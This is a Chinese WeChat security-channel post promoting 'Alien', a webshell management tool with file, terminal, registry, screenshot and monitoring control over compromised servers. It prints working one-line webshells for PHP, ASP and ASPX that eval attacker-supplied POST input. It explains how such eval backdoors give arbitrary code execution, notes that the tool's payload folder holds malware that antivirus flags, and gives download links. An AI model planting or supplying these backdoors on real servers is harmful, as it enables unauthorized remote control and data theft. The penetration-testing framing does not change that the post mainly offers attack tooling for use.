#  一款新的webshell管理工具

malbuffer4pt  [ 昊天信安 ](javascript:void\(0\);)

**昊天信安** ![]()

微信号 cniaosec

功能介绍 致力于分享渗透实战、红蓝工具、漏洞复现、代码审计、应急响应等技术及工具。

____

___发表于_

收录于合集

**项目简介**

##  **语言**

C# .NET Framework V4.8

##  **功能**

  * File Manager （可显示图片， 可SearchFile）
  * 虚拟终端
  * 数据库
  * 注册表
  * 监控
  * 截图
  * 系统信息

 **项目描述**

##  **一句话木马**

一句话木马是在渗透测试中用来控制服务器的工具  
强大之处在于木马本身体积小，不易发现  
以下是最简单的一句话木马

  *   *   *   * 

    
    
    PHP <?php @eval($_POST['password']);?>ASP <%execute(request("password"))%>ASPX <%@ Page Language="Jscript"%><%eval(Request.Item["password"])%>当然， Alien还可以使用asmx， ashx等等的Webshell。NodeJS和JSP https://github.com/malbuffer4pt/Alien/blob/main/shell.txt

 **关于JSP webshell**  
目前只有比较原始的菜刀版本， 之后可能会加上蚁剑和冰蝎  
shell有进行更改， 新增了可以显示图片的功能 **关于NodeJS webshell** 由于NodeJS特性， 原理跟一般php asp
aspx等动态语言的shell不同，  
NodeJS目的重在管理而非渗透 **伺服器** Windows， Linux， Unix， MacOS **Database管理** MySQL
：PHP交通 ：https://github.com/malbuffer4pt/DBerSQL Server ：ASP ASPX ASMX ASHX

##  **原理**

以PHP为例子， eval（）可以把string以PHP Code去执行，  
如果eval（）中带有可控变量，那么就可以执行任意代码。  
如eval（$_POST['a']）;  
HTTP POST a=phpinfo(); 就可以执行phpinfo（）; **注意!**

  * 工具Payloads文件夹内有符合恶意程序的Payload， 可能会被防毒删除
  * 目前只有删减版，但部份代码没有删除，Disassemble应该会有奇怪但无法使用的东西

 **图片**  

![]()

![]()

![]()

![]()

![]()

![]()

![]()

![]()

![]()

![]()

![]()

![]()

 **下载地址** 1\.  链接：https://pan.quark.cn/s/49fd7d9478f1  
2.  https://github.com/malbuffer4pt/Alien![]()

预览时标签不可点

微信扫一扫  
关注该公众号

[知道了](javascript:;)

微信扫一扫  
使用小程序

****

[取消](javascript:void\(0\);) [允许](javascript:void\(0\);)

****

[取消](javascript:void\(0\);) [允许](javascript:void\(0\);)

： ， 。   视频 小程序 赞 ，轻点两下取消赞 在看 ，轻点两下取消在看

